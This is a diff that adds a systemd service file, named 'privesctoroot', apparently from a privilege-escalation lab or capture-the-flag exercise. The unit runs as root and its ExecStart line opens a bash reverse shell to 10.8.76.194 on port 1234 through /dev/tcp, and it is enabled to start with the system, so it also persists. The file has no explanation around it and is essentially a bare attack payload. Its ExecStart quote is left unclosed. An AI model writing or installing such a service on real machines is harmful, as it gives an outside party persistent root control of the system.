@@ -1,0 +1,10 @@
+[Unit]
+Description=privesctoroot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.8.76.194/1234 0>&1
+
+[Install]
+WantedBy=multi-user.target
